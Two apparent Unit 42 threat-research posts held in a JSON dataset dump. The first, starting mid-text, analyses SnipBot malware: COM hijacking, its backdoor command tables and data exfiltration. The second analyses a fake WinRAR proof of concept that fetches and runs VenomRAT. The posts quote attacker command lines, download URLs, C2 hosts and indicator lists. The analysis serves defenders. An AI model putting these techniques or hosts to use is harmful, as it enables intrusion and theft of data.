drvmcprotect[.]com and inject it into Explorer.\nFor this, it uses COM hijacking to register the file as the thumbnail cache library in the registry hive of the current user.\nWhen restarting explorer.exe, the DLL gets loaded into its address space and executed.\nWhile this is a reliable method of loading a payload into Explorer, forcing it to terminate can result in a crash, as it did on the victim's machine.\nFigure 5 illustrates how the registered COM DLL keyprov.dll loads into explorer.exe after restarting.\nTo download the COM DLL from the C2 server, config-pdf.dll sends the command get_update_manager2.\nAdditionally, the first payload gets a second encrypted DLL by sending the command get_update_inet2.\nThis payload (internally named single.dll) gets stored in the registry in the key HKCU\\SOFTWARE\\AppDataSoft\\Software as a binary value named trem1.\nAt last, in the same registry key, the threat creates another binary value named trem3 that contains the string UPDE1.\nThe threat likely uses this value to keep track of the number of updates for the registry payloads.\nAfter keyprov.dll gets loaded into Explorer, it tries to imitate a real COM provider.\nIt is able to do so as it’s an ordinary DLL with the needed export functions DllGetClassObject and DllCanUnloadNow.\nTo do so, the code in keyprov.dll’s DllGetClassObject function acts as a forwarder to the same named function in shdocvw.dll, which is a legit COM DLL also loaded in explorer.exe.\nThe code in DllMain contains the two key tasks of the DLL.\nThese tasks are to decrypt and execute the encrypted payload in the registry and to create a network listener for incoming commands.\nThe threat’s first task is to decrypt and execute two DLL payloads from the registry values trem1 and trem2.\nIn our case, only the payload stored in trem1 got downloaded from the C2 server.\nThe second task is to listen on port 1342 for the following incoming string commands sent over TCP.\nTable 1 shows the commands implemented in keyprov.dll related to the bot’s operation.\n| Command | Description | | delete bot | Delete the following registry keys: HKCU\\SOFTWARE\\AppDataSoft\\Software HKCU\\SOFTWARE\\AppDataSoft HKCU\\SOFTWARE\\Classes\\CLSID\\{2155fee3-2419-4373-b102-6843707eb41f}\\InprocServer32 HKCU\\SOFTWARE\\Classes\\CLSID\\{2155fee3-2419-4373-b102-6843707eb41f} Create a BAT file %LOCALAPPDATA%\\temp.cmd with content: :rep\\r\\ntimeout 5\\r\\nrmdir /Q /S %1\\r\\nif not errorlevel 0 goto rep\\r\\ndel /q %0\\r\\n Create the following string to run the batch file via CreateProcess: C:\\Users\\ Restart the Explorer to unload any payloads: cmd /C taskkill /f /im explorer.exe && start explorer.exe | | update bot work | Decrypt and execute the payload stored in the trem2 value | | start bot file | Decrypt and execute the payload stored in the trem2 value | Table 1.\nCommands for keyprov.dll’s network listener.\nThe main SnipBot file single.dll is a backdoor that gives the attacker multiple options to execute commands or download and run additional payloads.\nAll strings are encrypted, with each having its own decryption key.\nThe file created a mutex named SnipMutex, from which the malware’s name is derived.\nFor the initial C2 contact, the threat sends a string that is made from the following information collected from the victim’s system: - Computer/domain name - MAC address - Windows build number - Whether the machine is a Windows server Table 2 shows 27 commands in SnipBot’s main module single.dll.\n| Command | Description | | 0x1 | Get the total and free bytes of all available drives (RAM disk, CD-ROM, network, fixed/removable media, unknown) and send the information to the C2 server | | 0x2 | Get the file and directory structure of an attacker-provided directory path and send the result to the C2 server | | 0x3 | | | 0x4 | Upload the file content of an attacker-provided file path to the C2 server | | 0x5 | %LOCALAPPDATA%\\temp-log | | 0xC | rundll32.exe %LOCALAPPDATA%\\KeyStore\\SnippingTool.dll,Main single %LOCALAPPDATA%\\KeyStore\\SnippingTool.zip | | 0xD | rundll32.exe %LOCALAPPDATA%\\KeyStore\\SnippingTool.dll,Main | | 0xE | %LOCALAPPDATA%\\KeyStore\\SnippingTool.zip → %LOCALAPPDATA%\\KeyStore\\SnippingTool_s.zip %LOCALAPPDATA%\\KeyStore\\SnippingTool_s.zip | | 0xF | Send a list of running processes (file names) and their IDs to the C2 server | | 0x11 | | | 0x12 | %LOCALAPPDATA%\\KeyStore\\SnippingTool.dll | | 0x13 | \\%LOCALAPPDATA%\\DataCache %LOCALAPPDATA%\\DataCache\\FontCache.dll rundll32.exe %LOCALAPPDATA%\\DataCache\\FontCache.dll,Main | | 0x14 | %LOCALAPPDATA%\\KeyStore\\ms-win-tmp.zip %LOCALAPPDATA%\\KeyStore\\ms-win-tmp.zip | | 0x15 | cd /d %LOCALAPPDATA%\\KeyStore\\ socks5.exe 54321 %LOCALAPPDATA%\\Keystore\\plink.exe -ssh -pw started on - | | 0x16 | %LOCALAPPDATA%\\KeyStore\\ms-proxy.exe %LOCALAPPDATA%\\KeyStore\\svcnet.exe | | 0x18 | Upload all files from the %LOCALAPPDATA%\\Datacache\\ directory to the C2 server and delete them afterwards.\n| | 0x1A | Create a hidden cmd.exe process and wait for incoming 0x1B commands | | 0x1B | Run an attacker-provided command to the already running hidden cmd.exe process and send the output to the C2 server | | 0x1C | | | 0x20 | Upload all files with the extensions TXT, RTF, XLS, XLSX, ODS, CMD, PDF, VBS, PS1, ONE, KDB, KDBX, DOC, DOCS, ODT, EML, MSG and EMAIL from the following directories to the C2 server: | | 0x26 | %PUBLIC%\\Libraries\\paper.exe %PUBLIC%\\Libraries\\7za.exe a -tzip | | 0x29 | %PUBLIC%\\Libraries\\7za.exe a -tzip %PUBLIC%\\Libraries\\7za.exe %PUBLIC%\\Libraries\\archi.zip %PUBLIC%\\Libraries\\paper.exe | | 0x2A | %LOCALAPPDATA%\\KeyStore\\7za.exe | | 0x2B | %LOCALAPPDATA%\\KeyStore\\7za.exe a -tzip %LOCALAPPDATA%\\KeyStore\\archiveSSL.zip -w %PUBLIC%\\Libraries\\7za.exe %PUBLIC%\\Libraries\\archiveSSL.zip | | 0x2C | %LOCALAPPDATA%\\KeyStore\\SnippingTool.dll | | 0x2D | %LOCALAPPDATA%\\KeyStore\\InfoWind.dll | | 0x2E | rundll32.exe %LOCALAPPDATA%\\KeyStore\\InfoWind.dll,stw %LOCALAPPDATA%\\KeyStore\\7za.exe %LOCALAPPDATA%\\KeyStore\\tempol.zip | Table 2.\nSupported commands of SnipBot’s main module single.dll.\nThe main module provides the operator with command-line, uploading and downloading capabilities on a victim’s system.\nIt also allows an attacker to download and execute the following additional payloads from the attacker’s server: - SnippingTool.dll - FontCache.dll - InfoWind.dll - paper.exe - socks5.exe - ms-proxy.exe - svcnet.exe - plink.exe While these file names imply what the payloads might do, we can only speculate about their purposes.\nWe haven’t seen any of these files dropped on a victim’s system during our investigation.\nWhen someone sends a command that the threat does not support, it sends the string command: Newer Downloader Versions While conducting analysis for this post, we monitored VirusTotal for any newly submitted downloader samples.\nWe found five newer versions that are almost identical in function, but they differ in their implementation.\nAll samples were hosted on temp[.]sh, which seems to be a preferred file sharing service of the attacker.\nThe newest version differs in the set of dynamically resolved API functions compared to the downloader from our case.\nAlso, the window message-based obfuscation code was removed.\nThe newest sample of this version we found was named Attachment_CV_June2024.exe (SHA256: 5390ba094cf556f9d7bbb00f90c9ca9e04044847c3293d6e468cb0aaeb688129) and it connected to the C2 domain linedrv[.]com to download the decoy PDF and next stage payload.\nWe found a slightly older sample named atch_Medical_Report_Scan05202024.exe (SHA256: 0be3116a3edc063283f3693591c388eec67801cdd140a90c4270679e01677501), that had the same signer and the C2 domain drv2ms[.]com.\nThe last sample, whose filename is unknown (SHA256: 2c327087b063e89c376fd84d48af7b855e686936765876da2433485d496cb3a4), was signed by Hangzhou Yueju Apparel Co., Ltd. and it also contacted drv2ms[.]com.\nThe second most recent version we found has a few window-related API functions left in the code, but the threat actors did not use them for any obfuscation techniques.\nThis version used another anti-sandbox trick by checking whether there are at least 50 sub-keys in the Shell Bags registry key, which is a typical number for a user system.\nShell Bags are stored configuration settings within the registry that remember folder display preferences, such as position, size and view mode in Windows Explorer.\nWe found a sample of this version named atch_List_of_Available_Documents.exe (SHA256: a2f2e88a5e2a3d81f4b130a2f93fb60b3de34550a7332895a084099d99a3d436) that was also signed by Hangzhou Yueju Apparel Co., Ltd. When executed, it connected to the C2 domain olminx[.]com to download the next stage payload.\nThis earliest version also used the window-based control-flow obfuscation technique.\nWe found a sample that was named Atch_Data_Breach_Evidence.pdf … Open with Adobe Acrobat.exe (SHA256: 5c71601717bed14da74980ad554ad35d751691b2510653223c699e1f006195b8) that was also signed by Hangzhou Yueju Apparel Co., Ltd., and it connected to olminx[.]com.\nEarlier Versions The earliest version of SnipBot we could find was submitted from Ukraine to VirusTotal in December 2023.\nThe initial infection vector was a PDF file named резюме.pdf.\nWhen opened, a message box appears saying the font package AdSlavicF is missing, luring the victim into clicking on the link to install it and show the content correctly.\nFigure 6 shows the PDF content with the unresolved text and the message indicating to click on the URL on top.\nWhen the victim clicks the link, they’re redirected to the website adobe.cloudcreative[.]digital/downloads/adobe/fontpackage/, which is meant to look like a legitimate Adobe site.\nThe name and logo shown are the work of a threat actor attempting to impersonate a legitimate organization.\nThey do not represent an actual affiliation with that organization.\nThe threat actor’s impersonation does not imply a vulnerability in the legitimate organization’s products or services.\nFigure 7 shows the landing page at adobe.cloudcreative[.]digital impersonating the legitimate Adobe download site.\nWhen the victim clicks on the “Download Font Package” button, a file download dialog appears.\nFigure 8 shows a dialog that simulates a legitimate Adobe font package download.\nBut instead, the initial SnipBot downloader gets downloaded from temp[.]sh/VwnkO/AdobeFontPackCx6416.exe.\nThe executable AdobeFontPackCx6416.exe (SHA256: cfb1e3cc05d575b86db6c85267a52d8f1e6785b106797319a72dd6d19b4dc317) is an earlier and simpler version of the initial downloader from our incident.\nIt also has a PDF icon, and it is signed with a valid certificate by COSMART LLC.\nThe downloader checks for the original filename for full execution and dynamically resolves all functions by API hashing.\nIt connects to the C2 server at ilogicflow[.]com to download the next stage, which we couldn’t obtain as the server wasn’t online anymore.\nThe file also seems to download a real font named AdSlavicF.ttf to the same directory as the SnipBot downloader and install it via InstallFontFile from the Windows library fontext.dll.\nWe can’t verify if this is the missing font that makes the document’s content visible or just a random one used to make the chain of events look more legitimate.\nWe also found an earlier version of config-pdf.dll (SHA256: b9677c50b20a1ed951962edcb593cce5f1ed9c742bc7bff827a6fc420202b045) submitted from Ukraine to VirusTotal in January 2024.\nThis version is not a DLL file but an EXE file submitted as webtime-e.exe.\nThis file connected to the C2 server at webtimeapi[.]com to download earlier versions of keyprov.dll and single.dll.\nThe earlier version of keyprov.dll was dropped as libapi.dll (SHA256: 9f635fa106dbe7181b4162266379703b3fdf53408e5b8faa6aeee08f1965d3a2) and was also created as a COM DLL.\nAgain, the threat used COM hijacking to register the file as the sync registration library in the registry hive of the current user and to load it into the Explorer.\nThe earlier version of single.dll was encrypted and stored in the registry key HKCU\\SOFTWARE\\AppDataHigh\\Software as a binary value named state1.\nAlso, it stored the string UPDE1 in a binary value named state2 under the same key.\nAnother sample of an earlier version named CV_for_a_job.exe (SHA256: 5b30a5b71ef795e07c91b7a43b3c1113894a82ddffc212a2fa71eebc078f5118) was submitted to VirusTotal in February 2024.\nIt was signed with a legitimate certificate from KHAROS LLC.\nThe file checks for the original process name and dynamically resolves functions by API hashing.\nIt was hosted on the server resolved by the domain name 1drv.fileshare[.]direct, a fake file sharing service set up by the attacker.\nThis sample drops and opens an embedded empty PDF file named AdobeARM.log.pdf instead of downloading it.\nIt only connected to the C2 server at certifysop[.]com to download and execute the next stage payload from memory.\nAll earlier versions only checked whether the process name was the original given filename as an anti-sandbox evasion method.\nThey didn’t use any registry-related tricks.\nPost-Infection Activity With the help of Cortex XDR telemetry data, we recreated post-infection activity from the attacker, which was mostly command-line commands.\nA timeline from the initial infection to the last seen command is shown below.\nFigure 9 shows the attacker's post-infection behavior on April 4, which occurred over a period of roughly four hours.\nWith the command-line functionality of SnipBot’s main module single.dll, the attacker first tried to gather information about the company’s internal network, including the domain controller.\nAfterwards, attackers attempted to exfiltrate a list of different files from the victim’s documents, downloads and OneDrive folders to the server with the IP address 91.92.250[.]104.\nThis server sent AD Explorer and WinRAR to the victim’s system for the second discovery phase.\nBefore the exfiltration, the attacker packed the files with WinRAR (renamed as fsutil.exe), while the actual data transfer to the server was achieved with the help of the PuTTY Secure Copy client (renamed as dsutil.exe).\nTable 3 shows the file types that the attackers target for data exfiltration.\n| File type | Related Software/Description | | db | SQLite database | | bbk | Unclear, might be a TreePad backup file | | dll | Windows dynamic-link library | | mp4 | MP4 digital media container | | msi | Microsoft Software Installer | | mp3 | MP3 digital audio coding | | wav | Waveform audio format | | dbs | SQLBase database | | exe | Windows executable | | iso | Optical disk image | | avi | Audio video interleave | | onetoc2 | Microsoft OneNote | | dcm | Digital imaging and communications in medicine | | zbf | Z-Buffer Radiance | | che | Unclear, might be related to CHwinEHE software | | mov | Quicktime multimedia container | | cab | Cabinet archive | | dat | Generic data format | | mkv | Matroska container | | xdw | DocuWorks | | zip | Archive format | | hwp | Hancom Office | | wmv | Windows media video | | mpj | Minitab | | des | CorelDRAW | | mtw | Minitab | | reg | Windows registry | | mac | Unclear, might be also Minitab | | cnt | Windows help | | chm | Windows compiled help | | hlp | WinHelp | | mpg | Digital video container | | mpeg | Digital video container | | mkv | Matroska container (duplicate) | | mts | Advanced video coding high definition | | vob | Video object container | Table 3.\nExfiltrated file types.\nThis list of file types contains some unusual ones, making any conclusions about the attacker’s motivation difficult.\nWhile some of the types appear to be standard files used to get more information about the victim's system, others appear to pertain to information about the victim's personal health (ZBF, DCM).\nThe data exfiltration attempt we observed didn’t seem to run smoothly, as the attacker tried to kill the PuTTY process (taskkill /pid 1628 /f).\nAfterward, the attacker manually downloaded a new copy of config-pdf.dll to the victim's system and started it with rundll32.exe.\nWhen we analyzed this file, we found this payload was the missing one downloaded from xeontime[.]com.\nHowever, this new version connected to a different C2 domain cethernet[.]com to get additional payloads or commands from the attacker.\nOne of the last activities we saw was that the attacker used AD Explorer (renamed as fsutil.exe) to create a snapshot of the local AD database.\nWe do not know whether this was successful, as the victim’s system was most likely a company laptop without any AD access.\nFinally, in the second data exfiltration phase, the attacker used WinRAR to create an archive of all files contained in the folder c:\\essential\\. This is the last activity shown in XDR telemetry data.\nIt’s likely that the attacker abandoned the victim’s system because its access to company sources was restricted, making it uninteresting for the attacker.\nCharacteristics Looking at the malware’s code, we can see that the authors implemented all functionality in a small number of very long functions.\nAll files were coded in C++.\nThe code contains a few minor flaws, indicating the attacker has experience as a Windows developer, but they are not seasoned professionals.\nFor example, Figure 10 shows the API function CreateDirectory() is called twice in a row, which appears to be a typical copy and paste mistake.\nTable 4 shows the C2 and staging domain information with the last active IP addresses.\n| C2/Staging Domains | Last IP Address | | fastshare[.]click | 52.72.49[.]79 | | (drv.)docstorage[.]link | 212.46.38[.]222 | | publicshare[.]link | 52.72.49[.]79 | | xeontime[.]com | 91.92.250[.]240 | | drvmcprotect[.]com | 91.92.254[.]54 | | mcprotect[.]cloud | 185.225.74[.]94 | | cethernet[.]com | 91.92.254[.]234 | | sitepanel[.]top | 91.92.254[.]234 | | drv2ms[.]com | 79.141.170[.]34 | | olminx[.]com | 91.92.250[.]106 | | ilogicflow[.]com | 23.184.48[.]90 | | webtimeapi[.]com | 91.92.242[.]87 | | dns-msn[.]com | 91.92.242[.]87 | | certifysop[.]com | 23.137.248[.]220 | | linedrv[.]com | 38.180.5[.]251 | | (adobe.)cloudcreative[.]digital | 23.137.249[.]182 | | (1drv.)fileshare[.]direct | 23.137.249[.]14 | Table 4.\nC2/Staging domain name information.\nConclusion With the detection capabilities of our advanced Windows sandbox memory scanning tool, we identified an unusual DLL module as part of a new RomCom version dating back to at least December 2023.\nThis updated RomCom version called SnipBot uses a custom obfuscation technique and new anti-analysis tricks.\nThe attacker's intentions are difficult to discern given the variety of targeted victims, which include organizations in sectors such as IT services, legal and agriculture.\nWhile attackers have occasionally dropped ransomware on systems infected with RomCom in the past, this did not occur in our cases or in any of Sophos' incidents.\nWe suspect this threat actor has shifted its aim away from pure financial gain toward espionage.\nCERT-UA has also published further information about the threat actor behind SnipBot, including other tools and indicators of compromise (IoC).\nThis highlights the need for organizations to remain vigilant and adopt advanced security measures to protect their systems and data from evolving cyberthreats.\nPalo Alto Networks customers are better protected from the SnipBot malware through products like Cortex and Advanced WildFire, with its different memory analysis features.\nAdvanced WildFire classifies the SnipBot malware samples in this article as malicious.\nAdvanced URL Filtering and Advanced DNS Security classify known URLs and domains associated with this activity as malicious.\nIf you think you might have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nWe would like to thank Sophos for the collaboration.\nIndicators of Compromise Files (Read: SHA256 hash - file type) - 0be3116a3edc063283f3693591c388eec67801cdd140a90c4270679e01677501 - 64-bit EXE - 1cb4ff70f69c988196052eaacf438b1d453bbfb08392e1db3df97c82ed35c154 - 64-bit DLL - 2c327087b063e89c376fd84d48af7b855e686936765876da2433485d496cb3a4 - 64-bit EXE - 5390ba094cf556f9d7bbb00f90c9ca9e04044847c3293d6e468cb0aaeb688129 - 64-bit EXE - 57e59b156a3ff2a3333075baef684f49c63069d296b3b036ced9ed781fd42312 - 64-bit EXE - 5b30a5b71ef795e07c91b7a43b3c1113894a82ddffc212a2fa71eebc078f5118 - 64-bit EXE - 5c71601717bed14da74980ad554ad35d751691b2510653223c699e1f006195b8 - 64-bit EXE - 60d96087c35dadca805b9f0ad1e53b414bcd3341d25d36e0190f1b2bbfd66315 - 64-bit DLL - 92c8b63b2dd31cf3ac6512f0da60dabd0ce179023ab68b8838e7dc16ef7e363d - 64-bit DLL - a2f2e88a5e2a3d81f4b130a2f93fb60b3de34550a7332895a084099d99a3d436 - 64-bit EXE - b9677c50b20a1ed951962edcb593cce5f1ed9c742bc7bff827a6fc420202b045 - 64-bit EXE - cfb1e3cc05d575b86db6c85267a52d8f1e6785b106797319a72dd6d19b4dc317 - 64-bit EXE - e5812860a92edca97a2a04a3151d1247c066ed29ae6bbcf327d713fbad7e79e8 - 64-bit DLL - f74ebf0506dc3aebc9ba6ca1e7460d9d84543d7dadb5e9912b86b843e8a5b671 - PDF document Mutex - SnipMutex Associated Domains/IP addresses - fastshare[.]click - docstorage[.]link - publicshare[.]link - xeontime[.]com - drvmcprotect[.]com - mcprotect[.]cloud - cethernet[.]com - sitepanel[.]top - ilogicflow[.]com - webtimeapi[.]com - dns-msn[.]com - certifysop[.]com - drv2ms[.]com - olminx[.]com - linedrv[.]com - adobe.cloudcreative[.]digital - 1drv.fileshare[.]direct - 91.92.250[.]104 Directory paths - %LOCALAPPDATA%\\KeyStore - %LOCALAPPDATA%\\DataCache - %LOCALAPPDATA%\\AppTemp Registry Keys - HKCU\\SOFTWARE\\AppDataSoft - HKCU\\SOFTWARE\\AppDataHigh Code Signers (Possibly Spoofed) - CC Byg og Udlejning ApS - COSMART LLC - KHAROS LLC - Hangzhou Yueju Apparel Co., Ltd. - ARION LLC","num_sentences":179,"metadata":{"source":"blog","platform":"Unit42","filename":"SnipBot"}}
{"id":87,"title":"Fake CVE-2023-40477 Proof of Concept Leads to VenomRAT","publish_date":"2023-07-16","link":"https://unit42.paloaltonetworks.com/fake-cve-2023-40477-poc-hides-venomrat/","clean_text":"Executive Summary Researchers should be aware of threat actors repurposing older proof of concept (PoC) code to quickly craft a fake PoC for a newly released vulnerability.\nOn Aug. 17, 2023, the Zero Day Initiative publicly reported a remote code execution (RCE) vulnerability in WinRAR tracked as CVE-2023-40477.\nThey had disclosed it to the vendor on June 8, 2023.\nFour days after the public reporting of CVE-2023-40477, an actor using an alias of whalersplonk committed a fake PoC script to their GitHub repository.\nThe fake PoC meant to exploit this WinRAR vulnerability was based on a publicly available PoC script that exploited a SQL injection vulnerability in an application called GeoServer, which is tracked as CVE-2023-25157.\nWe analyzed the fake PoC script and all the links in the infection chain, which ultimately installed a VenomRAT payload.\nWe do not think the threat actor created this fake PoC script to specifically target researchers.\nRather, it is likely the actors are opportunistic and looking to compromise other miscreants trying to adopt new vulnerabilities into their operations.\nBased on a timeline of events, we believe the threat actor had created the infrastructure and payload independently from the fake PoC. Once the vulnerability was publicly released, the actors acted quickly to capitalize on the severity of an RCE in a popular application.\nWinRAR states they have over 500 million users worldwide.\nWe would like to thank fellow Cyber Threat Alliance (CTA) member Broadcom/Symantec (@threatintel) for sharing the initial sample on this CVE.\nPalo Alto Networks customers received protection from this infection chain prior to the fake PoC code’s creation with WildFire and Advanced URL Filtering.\nThe domain checkblacklistwords[.]eu used to host the various files needed for infection and the VenomRAT payload were automatically categorized as malware before the PoC was committed to GitHub.\n| Related Unit 42 Topics | Vulnerability, Remote Access Trojan | Fake It Until You Make It An unknown actor using the alias whalersplonk released a fake PoC script for an RCE vulnerability in WinRAR tracked by CVE-2023-40477.\nThis PoC is fake, as it does not exploit the intended vulnerability.\nRather, it is based on publicly available PoC code for a vulnerability in GeoServer tracked by CVE-2023-25157.\nInstead of exploiting the WinRAR vulnerability as it claims, the PoC script sets off an infection chain that (after several steps) will install a VenomRAT payload.\nThe CVE-2023-40477 vulnerability in WinRAR allows an attacker to execute code on a system that opens a malicious file.\nAccording to the vendor’s announcement on Aug. 24, 2023, the Zero Day Initiative initially reported the CVE-2023-40477 vulnerability on June 8, 2023, and publicly reported it on Aug. 17, 2023.\nThe timestamps within the ZIP archive suggest that the actor committed the files to GitHub on Aug. 21, 2023, four days after the vulnerability was publicly announced.\nAccording to a Tweet by @AabyssZG seen in Figure 1, this fake PoC archive was hosted at a GitHub repository for a user named whalersplonk.\nVisiting this repository now results in a 404 error, as the repository was removed.\nThe fake PoC is a Python script that was uploaded to VirusTotal in a ZIP archive named CVE-2023-40477-main.zip, specifically poc.py.\nThe code snippet below shows the contents of the CVE-2023-40477-main.zip archive in 7-Zip.\nWe believe the CVE-2023-40477-main.zip file itself was generated by downloading the entire repository by clicking the “Download ZIP” button in GitHub.\n| 1 2 3 4 5 6 7 8 9 10 11 12 13 | Listing archive: CVE-2023-40477-main.zip -- Path = CVE-2023-40477-main.zip Type = zip Physical Size = 2360 Comment = 82cb695f463b93b9cc089253cd6b5e32dce46c35 Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2023-08-21 21:15:49 D.... 0 0 CVE-2023-40477-main 2023-08-21 21:15:49 ..... 752 442 CVE-2023-40477-main/README.md 2023-08-21 21:15:49 ..... 3656 1424 CVE-2023-40477-main/poc.py ------------------- ----- ------------ ------------ ------------------------ 2023-08-21 21:15:49 4408 1866 2 files, 1 folders | Social Engineering Figure 2 shows that the README.md file within the ZIP archive attempts to further trick the user into compromising their system by providing a summary of the CVE-2023-40477 vulnerability and usage instructions for the poc.py script.\nThe instructions also include a link to a video hosted on streamable[.]com.\nThe video is no longer hosted at the URL within the README.md file, as it was set to expire on Aug. 25, 2023 5:35:00 AM UTC.\nWe discovered interesting information regarding the video via the metadata provided by Streamable.\nTable 1 shows key pieces of information about the video hosted at Streamable, including the date the video was uploaded, which aligns with our timeline.\nThe number of plays suggests that over 100 individual views of the video took place.\n| Metadata Field | Value | | date_added | 1692656432.078 (Aug. 21, 2023 10:20:32 PM UTC) | | original_name | 22.08.2023_00.17.56_REC.mp4 | | duration | 20.303278 seconds | | plays | 121 (as of 2023-08-22 05:38:32) | Table 1.\nMetadata fields and values for the video.\nWe also obtained two screenshots associated with the 22.08.2023_00.17.56_REC.mp4 uploaded to Streamable, which were used as thumbnails to display parts of the video.\nThe first image, which Streamable displays before the user clicks the play button on the video, shows the threat actor’s desktop and their task manager.\nFigure 3 depicts the task manager showing a process named Windows.\nGaming.\nPreview, which is the same executable name as the VenomRAT payload discussed later in this article.\nWe suspect the threat actor used the same system to test their payload and make this demonstration video.\nThe second screenshot shown in Figure 4, which we believe Streamable captures halfway through the video, displays the actor showing an archive of Burp Suite, a password of 311138, and the PuTTY client.\nWe believe the actor was pretending to show how to craft a malicious archive and use the script to exploit the CVE-2023-40477 vulnerability in WinRAR.\nMore importantly, the screenshot also depicts the Windows clock showing 8/21/2023 3:17 PM.\nWe can use this information in our timeline to determine where it fits, and to speculate the time zone the actor is in based on other activities.\nWe believe the burpsuite_pro_v2023.2.2.zip archive seen in the video above was obtained from a Telegram post, as seen in Figure 5.\nWe did not analyze the Burp Suite application provided by the Telegram post to determine if it was a legitimate version, as available from the PortSwigger website.\nFake Proof of Concept The fake PoC Python script within the ZIP archive was named poc.py, which was based on the open-source CVE-2023-25157 PoC with some changes shown in Figure 6.\nThe changes to the CVE-2023-25157 PoC code included the following: - Removal of comments regarding details about the CVE-2023-25157 vulnerability - Removal of lines of code that would suggest it’s a network-related vulnerability, such as the setting of variables named PROXY and PROXY_ENABLED - Modified strings from geoserver to exploit - Inclusion of additional code that downloads and executes a batch script with a comment of “Check dependency” The poc.py script no longer runs correctly due to the removal of several lines of code.\nHowever, the malicious code added to the script does run properly before the script ends in an exception, as seen in Figure 7.\nThe code added to the CVE-2023-25157 PoC shown in the green lines of code on the right side of Figure 6 above creates a batch script in %TEMP%/bat.bat.\nThis script will reach out to the following URL and run the response: - http://checkblacklistwords[.]eu/check-u/robot?963421355?Ihead=true The batch script hosted at the URL above runs an encoded PowerShell script that will download another PowerShell script from checkblacklistwords[.]eu/c.txt.\nThe script then saves this file to %TEMP%\\c.ps1 and runs it, as seen in the following code block: The downloaded PowerShell script downloads an executable from checkblacklistwords[.]eu/words.txt and saves it to %APPDATA%\\Drivers\\Windows.\nGaming.\nPreview.exe.\nThe PowerShell script not only runs the executable, but it also creates a scheduled task named Windows.\nGaming.\nPreview that runs the executable every three minutes to persistently run the payload.\nThe Windows.Gaming.Preview.exe executable is a variant of VenomRAT, which is the same name as the running process seen in the task manager displayed during the video in the README.md file shown in Figure 3 above.\nThis suggests that the threat actor may have been running the VenomRAT payload on their system when they made the video.\nThis particular variant of VenomRAT has the following configuration: | 1 2 3 4 5 6 7 8 9 10 11 12 13 | Por_ts = null Hos_ts = null Ver_sion = Venom RAT + HVNC + Stealer + Grabber v6.0.3 In_stall = false MTX = fqziwqjwgwzscvfy Paste_bin = http://checkblacklistwords[.]eu/list.txt An_ti = false Anti_Process = false BS_OD = false Group = Default Hw_id = HEX(MD5(<cpu count> + <username> + <hostname> + <os version> + <system directory>)) Server_signa_ture = TtHk/GR7jC2p75o/t7g/BLsDYghocYu2[snip] Server_certificate = MIICOTCCAaKgAwIBAgIVAPyfwFFMs6h[snip] | The configuration field Paste_bin has a value of http://checkblacklistwords[.]eu/list.txt, which the executable will communicate with to obtain the command and control (C2) location.\nThis URL suggests the C2 is at the following IP address: - 94.156.253[.]109:4449 This particular VenomRAT client starts a key logger functionality that logs keystrokes to %APPDATA%\\MyData\\DataLogs_keylog_offline.txt.\nThe client then begins communicating with its C2 server and will process the server's response for the commands shown in Table 2.\n| Command | Description | | plu_gin | Invokes a plugin by name that is saved to a key in the registry via the save_Plugin command | | HVNCStop | Gets a process by name cvtres and kills it.\n| | loadofflinelog | Uploads the offline key logger file from %APPDATA%\\MyData\\DataLogs_keylog_offline.txt | | save_Plugin | Saves a plugin to the registry for loading via the plu_gin command.\nPlugins saved to a specified subkey in Software\\\\ | | runningapp | Gets the running processes | | keylogsetting | Provides a new key log configuration file that will save to %APPDATA%\\MyData\\DataLogs.conf | | init_reg | Deletes subkeys in Software\\\\ | | Po_ng | Sends the interval between the last PING message sent to the C2 server and the receipt of the Po_ng command | | filterinfo | Gets installed applications list from the registry (SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall) and the running processes.\n| Table 2.\nCommands and their description for the VenomRAT variant.\nAccording to the VenomRAT sample’s portable executable (PE) header, the executable was compiled on Feb. 8, 2023, at 22:10:28 UTC.\nWe found over 700 VenomRAT samples that had this same compilation time.\nThis suggests that this particular sample was likely created with a standard VenomRAT builder that used a base executable and modified it with updated configuration settings.\nWe have made the full list of SHAs and IoCs available on GitHub.\nTimeline of Events Unit 42 researchers built a timeline of events surrounding this incident seen in Figure 8 using the timestamps previously mentioned above as well as those seen within our internal products.\nThese timestamps are those specifically associated with the following: - The public release of the CVE-2023-40477 vulnerability - The threat actor’s activities, including the setup of infrastructure and the deployment of the fake PoC - Palo Alto Networks product coverage The timeline shows that the threat actor created the checkblacklistwords[.]eu domain used in the infection chain at least 10 days prior to the public release of CVE-2023-40477.\nThis was 14 days before they committed the fake PoC code to GitHub.\nHowever, the HTTP response to the URL hxxp://checkblacklistwords[.]eu/ has a Last-Modified field that is set to Sun, 16 Jul 2023 18:43:54 GMT, which suggests that the actor could have initially set up the server over a month before the public release of the vulnerability.\nAccording to Palo Alto Networks product coverage, both WildFire and Advanced URL Filtering processed and provided malware verdicts to the following: - VenomRAT payload - checkblacklistwords[.]eu domain - Two of the URLs seen in the infection chain Advanced URL Filtering automatically processed and provided a malicious verdict to the remaining URL seen in the infection chain a day after the actor released the fake PoC. Based on this timeline, we believe the threat actor had created the infrastructure and payload separately from the fake PoC. Once the vulnerability was publicly released, the actors quickly created the fake PoC to use the severity of an RCE in a popular application like WinRAR to lure in potential victims.\nConclusion An unknown threat actor attempted to compromise individuals by releasing a fake PoC after the vulnerability’s public announcement, to exploit an RCE vulnerability in a well-known application.\nThis PoC is fake and does not exploit the WinRAR vulnerability, suggesting the actor tried to take advantage of a highly sought after RCE in WinRAR to compromise others.\nThe fake PoC is based on publicly available code for a vulnerability in GeoServer that sets off an infection chain that installs VenomRAT.\nWhile we cannot provide accurate figures on the impact or number of compromises, we saw that the instructional video provided by the actor along with the fake exploit script had 121 views.\nPalo Alto Networks customers received protection from this fake PoC as the checkblacklistwords[.]eu domain and VenomRAT sample had malicious verdicts prior to the creation of the fake exploit script.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks would like to thank fellow Cyber Threat Alliance 